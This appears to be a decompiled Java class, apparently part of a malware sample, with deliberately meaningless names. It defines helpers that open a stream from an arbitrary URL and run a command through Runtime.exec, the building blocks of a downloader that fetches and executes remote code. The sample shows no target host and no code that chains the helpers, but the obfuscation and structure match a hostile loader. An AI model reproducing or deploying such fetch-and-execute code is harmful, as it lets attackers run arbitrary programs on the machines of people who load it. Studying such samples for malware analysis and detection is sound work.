import java.net.URL;
import java.io.InputStream;

// 
// Decompiled by Procyon v0.5.30
// 

public class Qoplk
{
    public static Runtime Sefjf() {
        return Runtime.getRuntime();
    }
    
    public static InputStream SFG(final String sdhds) throws Exception {
        final URL url = new URL(sdhds);
        try {
            url.openConnection();
        }
        catch (Exception ex) {}
        return url.openStream();
    }
    
    public static void Kopldd(final String fn) throws Exception {
        final Process dexa = Sefjf().exec(fn);
        dexa.waitFor();
    }
}
